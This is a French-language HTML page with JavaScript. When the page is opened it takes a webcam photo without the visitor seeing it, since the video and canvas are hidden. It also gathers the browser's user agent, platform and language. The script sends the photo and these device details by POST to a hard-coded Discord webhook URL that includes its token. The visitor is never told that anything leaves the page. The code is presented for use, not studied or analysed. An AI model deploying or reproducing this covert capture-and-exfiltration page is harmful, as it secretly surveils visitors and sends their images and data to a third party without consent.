<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prendre une photo et envoyer les infos</title>
    <style>
        #camera {
            display: none;
        }
        #photo {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Prendre une photo automatiquement et envoyer les informations</h1>
    <p>Veuillez autoriser l'accès à la caméra pour prendre une photo automatiquement.</p>
    <video id="camera" width="320" height="240" autoplay></video>
    <canvas id="photo" width="320" height="240"></canvas>

    <script>
        function obtenirInfosAppareil() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;

            return `User Agent: ${userAgent}\nPlatform: ${platform}\nLanguage: ${language}`;
        }

        function envoyerImage(blob) {
            const formData = new FormData();
            formData.append('file', blob, 'photo.png');

            // Remplacez l'URL ci-dessous par l'URL de votre webhook Discord
            const url = 'https://discord.com/api/webhooks/1264515631122878466/IeM3kvt1ZIIcvP7tq2NBQtG80ARxiqkuKv-PBjLbjFwuOr87Im8l6ls3LVybGGxL-Xvu';
            return fetch(url, {
                method: 'POST',
                body: formData
            });
        }

        function envoyerInfos(infos) {
            const url = 'https://discord.com/api/webhooks/1264515631122878466/IeM3kvt1ZIIcvP7tq2NBQtG80ARxiqkuKv-PBjLbjFwuOr87Im8l6ls3LVybGGxL-Xvu';
            return fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: infos })
            });
        }

        (function() {
            const video = document.getElementById('camera');
            const canvas = document.getElementById('photo');
            const context = canvas.getContext('2d');

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    video.srcObject = stream;
                    video.play();
                    video.onloadeddata = function() {
                        // Prendre une photo automatiquement après que la vidéo a commencé
                        context.drawImage(video, 0, 0, 320, 240);
                        video.pause();

                        // Convertir l'image en base64
                        const dataURL = canvas.toDataURL('image/png');
                        const blob = dataURLToBlob(dataURL);
                        const infosAppareil = obtenirInfosAppareil();
                        
                        envoyerImage(blob)
                            .then(() => {
                                return envoyerInfos(infosAppareil);
                            })
                            .then(() => {
                                console.log('Image et informations envoyées avec succès');
                            })
                            .catch(error => {
                                console.error('Erreur lors de l\'envoi:', error);
                            });
                    };
                })
                .catch(function(err) {
                    console.log("Une erreur est survenue: " + err);
                });

            function dataURLToBlob(dataURL) {
                const byteString = atob(dataURL.split(',')[1]);
                const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                return new Blob([ab], { type: mimeString });
            }
        })();
    </script>
</body>
</html>
